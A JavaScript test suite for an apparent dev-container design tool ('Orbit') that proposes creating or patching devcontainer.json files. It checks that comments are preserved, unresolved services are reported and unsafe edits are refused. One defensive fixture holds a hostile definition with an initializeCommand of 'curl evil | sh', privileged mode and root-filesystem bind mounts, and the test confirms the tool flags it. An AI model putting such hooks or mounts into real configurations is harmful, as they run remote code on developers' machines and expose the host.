// The Environment Designer: what would have to change, worked out and never done.
// Scenarios B, C, D and the refusals -- missing definition, stale one, polyglot,
// an environment that cannot be touched -- with every comment still there.
import { test } from "node:test";
import assert from "node:assert/strict";
import { inspect } from "../src/runtime/environment/devcontainer.mjs";
import { design } from "../src/runtime/design/designer.mjs";
import { analyse, portGaps } from "../src/runtime/design/gap.mjs";
import { edit, parse, verify } from "../src/runtime/jsonc.mjs";
import { requirementsOf } from "../src/runtime/requirements.mjs";
import { DEVCONTAINER_JSONC, NODE_AND_DOTNET, POLYGLOT, SHIPPED_CATALOG, viewOf } from "./fakes/runtime.mjs";
import { fakeWorktree } from "./fakes/worktree.mjs";

const designed = (files, worktree = {}) => {
  const view = viewOf(files);
  const tree = fakeWorktree(worktree);
  const requirements = requirementsOf(view, SHIPPED_CATALOG);
  return { out: design({ requirements, inspected: inspect(tree), catalog: SHIPPED_CATALOG, name: "shop" }), requirements, tree };
};

const NEWER = { ...NODE_AND_DOTNET, "api/Api.csproj": `<Project Sdk="Vendor.NET.Sdk.Web"><PropertyGroup><TargetFramework>net9.0</TargetFramework></PropertyGroup></Project>`, "docker-compose.yml": "services:\n  cache:\n    image: redis:7\n" };

test("requirements are normalised and stack-free: an id, the version to install, who wants it, and what provides it", () => {
  const { environment, ports } = requirementsOf(viewOf(NODE_AND_DOTNET), SHIPPED_CATALOG);
  assert.deepEqual(environment.map((r) => [r.id, r.range, r.wanted, r.feature?.id ?? null, r.stages]), [["dotnet", ">=8.0", "8.0", "ghcr.io/devcontainers/features/dotnet", ["run"]], ["node", ">=22", "22", "ghcr.io/devcontainers/features/node", ["run"]], ["playwright", null, null, null, ["development"]]]);
  assert.deepEqual(ports, [5000]);
  assert.equal(environment.some((r) => r.id === "npm"), false, "npm comes WITH node, so it is not a second thing to provide");
});

test("Scenario B: no dev container -> a CREATE proposal of ONE file with the features the requirements ask for, and what no feature provides is said", () => {
  const { out } = designed(NODE_AND_DOTNET);
  assert.equal(out.state, "CREATE");
  assert.deepEqual(out.files.create.map((f) => f.path), [".devcontainer/devcontainer.json"]);
  const made = parse(out.files.create[0].text);
  assert.equal(made.ok, true, "what is written is what a reader reads back");
  assert.deepEqual(made.value, { name: "shop", image: "mcr.microsoft.com/devcontainers/base:ubuntu", features: { "ghcr.io/devcontainers/features/dotnet:2": { version: "8.0" }, "ghcr.io/devcontainers/features/node:1": { version: "22" } }, appPort: [5000] }, "a port is PUBLISHED: the Dev Containers CLI ignores forwardPorts");
  assert.match(out.files.create[0].text, /^\/\/ Created by Orbit/);
  assert.deepEqual(out.unresolved.map((u) => u.id), ["playwright"]);
  assert.equal(JSON.stringify(out).includes("postCreateCommand"), false, "no lifecycle hook is ever generated");
  assert.deepEqual(out.risks, []);
});

test("Scenario C: a stale dev container -> a PATCH of exactly what moved, every comment and every customisation still there", () => {
  const { out } = designed(NEWER, { ".devcontainer/devcontainer.json": DEVCONTAINER_JSONC });
  assert.equal(out.state, "PATCH");
  const [file] = out.files.patch;
  assert.deepEqual(file.edits.map((e) => [e.op, e.path.at(-1)]), [["set", "version"], ["set", "version"]], "the port was already published");
  const done = edit(DEVCONTAINER_JSONC, file.edits);
  assert.equal(done.ok, true);
  const kept = parse(done.text).value;
  assert.deepEqual([kept.features["ghcr.io/devcontainers/features/node:1"].version, kept.features["ghcr.io/devcontainers/features/dotnet:2"].version], ["22", "9.0"]);
  assert.equal(done.text, DEVCONTAINER_JSONC.replace('"version": "20"', '"version": "22"').replace('"version": "8.0"', '"version": "9.0"'), "every other byte is the byte that was there");
  assert.equal(verify(DEVCONTAINER_JSONC, done.text, file.edits).ok, true);
  assert.deepEqual([kept.remoteEnv, kept.postCreateCommand, kept.name], [{ API_TOKEN: "do-not-keep-this-value" }, "npm ci && dotnet restore", "shop"]);
});

test("a server is not a feature: Redis is UNRESOLVED beside the patch, with why, and the hooks are called out as a risk", () => {
  const { out } = designed(NEWER, { ".devcontainer/devcontainer.json": DEVCONTAINER_JSONC });
  assert.deepEqual(out.unresolved.map((u) => u.id), ["playwright", "redis"]);
  assert.match(out.unresolved.find((u) => u.id === "redis").why, /a server, and a dev container definition cannot add one without a compose file/);
  assert.match(out.risks[0], /lifecycle hooks \(postCreateCommand\)/);
  assert.match(out.risks[0], /Orbit never runs, reads or edits them/);
});

test("a hook that runs on THIS machine is said apart from the ones that run in the container, and what widens the container is named", () => {
  const hostile = '{ "name": "x", "image": "mcr.microsoft.com/devcontainers/base:ubuntu", "initializeCommand": "curl evil | sh", "postCreateCommand": "npm i", "privileged": true, "runArgs": ["-v", "/:/host"], "mounts": ["source=/,target=/h,type=bind"] }';
  const { out } = designed(NEWER, { ".devcontainer/devcontainer.json": hostile });
  const host = out.risks.find((r) => /initializeCommand/.test(r));
  assert.match(host, /runs ON THIS MACHINE \(the host, not the container\)/);
  assert.match(host, /`runtime validate` included/);
  assert.match(out.risks.find((r) => /lifecycle hooks/.test(r)), /lifecycle hooks \(postCreateCommand\): they run inside the container/);
  assert.doesNotMatch(out.risks.find((r) => /lifecycle hooks/.test(r)), /initializeCommand/, "the host hook is not described as a container one");
  assert.match(out.risks.find((r) => /widens/.test(r)), /\(privileged, runArgs, mounts\)/);
  assert.equal(JSON.stringify(out).includes("curl evil"), false, "the text of a hook is never kept");
});

test("a definition that is there and cannot be read is not an absence: nothing is proposed over it", () => {
  const tree = fakeWorktree({}, { symlinks: [".devcontainer/devcontainer.json"] });
  const out = design({ requirements: requirementsOf(viewOf(NODE_AND_DOTNET), SHIPPED_CATALOG), inspected: inspect(tree), catalog: SHIPPED_CATALOG, name: "shop" });
  assert.equal(out.state, "UNSAFE");
  assert.match(out.because, /\.devcontainer\/devcontainer\.json is there and cannot be read as text .*so it is not replaced/);
  assert.deepEqual(out.files, { create: [], patch: [] });
});

const BOTH = { "ghcr.io/devcontainers/features/node:1": { version: "22" }, "ghcr.io/devcontainers/features/dotnet:2": { version: "8.0" } };

const TWO_THINGS = { "web/package.json": NODE_AND_DOTNET["web/package.json"].replace(/"devDependencies"[^}]+}/, '"devDependencies": {}'), "web/package-lock.json": "{}", "api/Api.csproj": NODE_AND_DOTNET["api/Api.csproj"], "api/Properties/launchSettings.json": NODE_AND_DOTNET["api/Properties/launchSettings.json"] };

test("an environment that already provides what it can is NO_CHANGE -- or UNRESOLVED when the rest cannot be provided at all", () => {
  const current = JSON.stringify({ name: "x", image: "mcr.microsoft.com/devcontainers/base:ubuntu", features: BOTH, appPort: [5000] });
  const { out } = designed(TWO_THINGS, { ".devcontainer/devcontainer.json": current });
  assert.equal(out.state, "NO_CHANGE");
  assert.deepEqual(out.files, { create: [], patch: [] });
  assert.equal(designed(NODE_AND_DOTNET, { ".devcontainer/devcontainer.json": current }).out.state, "UNRESOLVED", "Playwright has no feature");
});

test("a version that cannot be compared is LEFT ALONE and said; a line is not mistaken for too old", () => {
  const lts = JSON.stringify({ features: { "ghcr.io/devcontainers/features/node:1": { version: "lts" }, "ghcr.io/devcontainers/features/dotnet:2": { version: "8" } }, appPort: [5000] });
  const { out } = designed({ ...NODE_AND_DOTNET, "web/package.json": JSON.stringify({ engines: { node: ">=22.5" }, scripts: { dev: "vite" } }) }, { ".devcontainer/devcontainer.json": lts });
  const states = Object.fromEntries(out.gaps.map((g) => [g.id, g.state]));
  assert.deepEqual([states.node, states.dotnet], ["unknown", "satisfied"]);
  assert.equal(out.files.patch.length, 0);
  assert.ok(out.notes.some((n) => /Node\.js is provided as "lts"/.test(n)), out.notes.join(" | "));
});

test("Scenario D: a polyglot checkout is the same model -- features for what has one, and what has none is said, per item", () => {
  const { out, requirements } = designed(POLYGLOT);
  assert.deepEqual(requirements.environment.map((r) => r.id).sort(), ["make", "node", "playwright", "python"]);
  assert.equal(out.state, "CREATE");
  assert.deepEqual(Object.keys(parse(out.files.create[0].text).value.features).sort(), ["ghcr.io/devcontainers/features/node:1", "ghcr.io/devcontainers/features/python:1"]);
  assert.deepEqual(out.unresolved.map((u) => u.id).sort(), ["make", "playwright", "postgres", "redis"]);
});

test("a definition that does not parse, a Windows image and an edit nothing can make are UNSAFE -- and nothing is proposed", () => {
  const broken = designed(NODE_AND_DOTNET, { ".devcontainer/devcontainer.json": "{ not json" }).out;
  assert.deepEqual([broken.state, broken.files], ["UNSAFE", { create: [], patch: [] }]);
  assert.match(broken.because, /does not parse/);
  const windows = designed(NODE_AND_DOTNET, { ".devcontainer/devcontainer.json": JSON.stringify({ build: { dockerfile: "Dockerfile" } }), ".devcontainer/Dockerfile": "FROM mcr.microsoft.com/windows/servercore:ltsc2022\n" }).out;
  assert.equal(windows.state, "UNSAFE");
  assert.match(windows.because, /Windows image/);
  const emptied = '{ "features": { /* none yet */ } }';
  const both = designed(NODE_AND_DOTNET, { ".devcontainer/devcontainer.json": emptied }).out;
  assert.equal(both.state, "PATCH", "the edits that CAN be made still are");
  assert.ok(both.unresolved.some((u) => /has a comment inside/.test(u.why)), "and the one that cannot is said");
});

test("an edit that would LOSE a comment is refused -- and when nothing else can be edited the proposal is UNSAFE", () => {
  const webOnly = { "web/package.json": JSON.stringify({ engines: { node: ">=22" }, scripts: { dev: "vite" } }), "web/package-lock.json": "{}" };
  const unsafe = designed(webOnly, { ".devcontainer/devcontainer.json": '{ "features": { /* none yet */ } }' }).out;
  assert.equal(unsafe.state, "UNSAFE");
  assert.match(unsafe.because, /cannot be made without losing something/);
  assert.deepEqual(unsafe.files, { create: [], patch: [] });
  const text = '{ "features": { "ghcr.io/devcontainers/features/node:1": { "version": /* why */ "20" } } }';
  const beside = designed(webOnly, { ".devcontainer/devcontainer.json": text }).out;
  assert.equal(beside.state, "PATCH", "a comment BESIDE a value is not inside it");
  assert.match(edit(text, beside.files.patch[0].edits).text, /"version": \/\* why \*\/ "22"/);
});

test("several definitions: the first is proposed against and the others are named, never silently ignored", () => {
  const { out } = designed(NODE_AND_DOTNET, { ".devcontainer/devcontainer.json": "{}", ".devcontainer/api/devcontainer.json": "{}" });
  assert.ok(out.notes.some((n) => /only the first is proposed against \(\.devcontainer\/api\/devcontainer\.json/.test(n)));
});

test("designing writes NOTHING: not a file, and not the working tree it read", () => {
  const { tree } = designed(NEWER, { ".devcontainer/devcontainer.json": DEVCONTAINER_JSONC });
  assert.deepEqual(tree.state.writes, []);
});

test("gap analysis names each requirement's state, and a port is only missing when nothing PUBLISHES it -- an editor's forwarding is not publishing", () => {
  const view = viewOf(NODE_AND_DOTNET);
  const requirements = requirementsOf(view, SHIPPED_CATALOG);
  const inspected = (extra) => inspect(fakeWorktree({ ".devcontainer/devcontainer.json": JSON.stringify({ features: { "ghcr.io/devcontainers/features/node:1": { version: "22" } }, ...extra }) })).definitions[0];
  assert.deepEqual(analyse(requirements, inspected({})).map((g) => [g.id, g.state]), [["dotnet", "missing"], ["node", "satisfied"], ["playwright", "unplaced"]]);
  assert.deepEqual(portGaps(requirements, inspected({ appPort: ["5000"] })), [], "5000 is published as a string, and that is still published");
  assert.deepEqual(portGaps(requirements, inspected({ appPort: "127.0.0.1:5000:5000" })), [], "bound to the loopback, as the CLI binds a number");
  assert.deepEqual(portGaps(requirements, inspected({ forwardPorts: [5000] })), [5000], "the Dev Containers CLI ignores forwardPorts");
  assert.deepEqual(portGaps(requirements, null), [5000]);
});

// What a real project showed: its Dockerfile installs three .NET SDKs and Node, and Orbit called both
// "missing" and proposed a feature for each -- a second copy of a runtime, hundreds of megabytes. A
// base Orbit cannot see inside is UNKNOWN; only the catalog's own base is known to carry nothing.
test("a runtime no feature provides is UNKNOWN when the definition builds from something Orbit cannot see inside, and no feature is proposed for it", () => {
  const view = viewOf(NODE_AND_DOTNET);
  const requirements = requirementsOf(view, SHIPPED_CATALOG);
  const inspected = (body) => inspect(fakeWorktree({ ".devcontainer/devcontainer.json": JSON.stringify(body), ".devcontainer/Dockerfile": "FROM mcr.microsoft.com/devcontainers/base:ubuntu-24.04\n" })).definitions[0];
  const base = SHIPPED_CATALOG.environment.baseImage;
  const state = (body) => Object.fromEntries(analyse(requirements, inspected(body), base).map((g) => [g.id, g.state]));
  assert.deepEqual(state({ build: { dockerfile: "Dockerfile" } }), { dotnet: "unknown", node: "unknown", playwright: "unplaced" });
  assert.match(analyse(requirements, inspected({ build: { dockerfile: "Dockerfile" } }), base)[0].because, /builds from its Dockerfile \(Dockerfile\), which may: Orbit cannot see inside without building it/);
  assert.deepEqual(state({ image: "mcr.microsoft.com/dotnet/sdk:8.0" }), { dotnet: "unknown", node: "unknown", playwright: "unplaced" }, "an image Orbit does not know may carry it too");
  assert.deepEqual(state({ image: base }), { dotnet: "missing", node: "missing", playwright: "unplaced" }, "the catalog's own base is known to carry no runtime");
  const { out } = designed(NODE_AND_DOTNET, { ".devcontainer/devcontainer.json": JSON.stringify({ build: { dockerfile: "Dockerfile" } }), ".devcontainer/Dockerfile": "FROM mcr.microsoft.com/devcontainers/base:ubuntu-24.04\n" });
  assert.equal(JSON.stringify(out.files ?? {}).includes("features"), false, "no feature is proposed for what the Dockerfile may already install");
});

test("what `appPort` publishes is read as Docker reads it: the HOST part, TCP only, and never a port Docker would pick", () => {
  const published = (appPort) => inspect(fakeWorktree({ ".devcontainer/devcontainer.json": JSON.stringify({ appPort }) })).definitions[0].summary.appPort;
  assert.deepEqual(published([5000, "5001", "8080:80", "127.0.0.1:7000:7001", "127.0.0.1::9000", "6000/tcp", "53:53/udp", "x"]), [5000, 5001, 8080, 7000, 6000]);
  assert.deepEqual([published(3000), published(undefined), published(null)], [[3000], [], []]);
});

test("a definition that only FORWARDS a port gets it published -- one key added, and the editor's forwarding left exactly as it is", () => {
  const forwarded = `{\n  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",\n  "features": ${JSON.stringify(BOTH)},\n  // the editor forwards this one\n  "forwardPorts": [5000]\n}\n`;
  const { out } = designed(TWO_THINGS, { ".devcontainer/devcontainer.json": forwarded });
  assert.equal(out.state, "PATCH");
  assert.deepEqual(out.files.patch[0].edits, [{ op: "insert", path: [], key: "appPort", value: [5000] }]);
  const done = edit(forwarded, out.files.patch[0].edits);
  assert.deepEqual([parse(done.text).value.forwardPorts, parse(done.text).value.appPort], [[5000], [5000]]);
  assert.ok(done.text.includes("// the editor forwards this one"));
  const single = designed(TWO_THINGS, { ".devcontainer/devcontainer.json": JSON.stringify({ features: BOTH, appPort: "8080:80" }) }).out;
  assert.deepEqual(single.files.patch[0].edits, [{ op: "set", path: ["appPort"], value: ["8080:80", 5000] }], "a single value becomes a list, and is kept");
});

test("a definition built from compose files publishes through them, and they are never edited: no `appPort`, a note instead", () => {
  const composed = JSON.stringify({ dockerComposeFile: "compose.yml", service: "app", features: BOTH });
  const { out } = designed(TWO_THINGS, { ".devcontainer/devcontainer.json": composed, ".devcontainer/compose.yml": "services:\n  app:\n    image: mcr.microsoft.com/devcontainers/base:ubuntu\n" });
  assert.equal(out.state, "NO_CHANGE");
  assert.ok(out.notes.some((n) => /the compose files \.devcontainer\/devcontainer\.json uses decide which ports reach this machine \(5000\); they are never edited/.test(n)), out.notes.join(" | "));
});

const COMPOSE = 'services:\n  db:\n    image: postgres:16-alpine\n    ports:\n      - "5432:5432"\n';
const OVERRIDE = "services:\n  app:\n    image: mcr.microsoft.com/devcontainers/base:ubuntu\n    command: sleep infinity\n    network_mode: service:db\n";

test("a server the definition's compose files bring up is PROVIDED, and said -- and the container the definition runs AS is no server at all", () => {
  const definition = JSON.stringify({ dockerComposeFile: ["../docker-compose.yml", "compose.dev.yml"], service: "app", workspaceFolder: "/workspaces/shop", features: BOTH });
  const env = { ".devcontainer/devcontainer.json": definition, ".devcontainer/compose.dev.yml": OVERRIDE, "docker-compose.yml": COMPOSE };
  const { out, requirements } = designed({ ...TWO_THINGS, ...env }, env);
  assert.deepEqual(requirements.services.map((s) => [s.service, s.name, s.file]), [["postgres", "db", "docker-compose.yml"]], "`app` is the environment itself");
  assert.equal(out.state, "NO_CHANGE");
  assert.ok(out.notes.includes("db (postgres) comes up with the environment: docker-compose.yml is one of the compose files it brings up"), out.notes.join(" | "));
});

test("a server defined in a compose file the definition does NOT bring up is unresolved, and the file is named", () => {
  const definition = JSON.stringify({ dockerComposeFile: "compose.dev.yml", service: "app", features: BOTH });
  const env = { ".devcontainer/devcontainer.json": definition, ".devcontainer/compose.dev.yml": OVERRIDE, "docker-compose.yml": COMPOSE };
  const { out } = designed({ ...TWO_THINGS, ...env }, env);
  assert.deepEqual(out.unresolved, [{ id: "postgres", why: "db (postgres) is defined in docker-compose.yml, which this definition does not bring up" }]);
});

// And an environment made FOR such an app holds Node.js: without it, the npm the app runs with has nothing
// to come with.
test("a requirement that comes WITH another brings that other into the environment, named or not", () => {
  const files = { "ui/package.json": JSON.stringify({ name: "ui", scripts: { start: "webpack serve" } }), "ui/package-lock.json": "{}" };
  const { environment } = requirementsOf(viewOf(files), SHIPPED_CATALOG);
  assert.deepEqual(environment.map((r) => [r.id, r.feature?.id ?? null]), [["node", "ghcr.io/devcontainers/features/node"]], "Node.js, by its feature -- and npm, which comes with it, is not asked for twice");
});
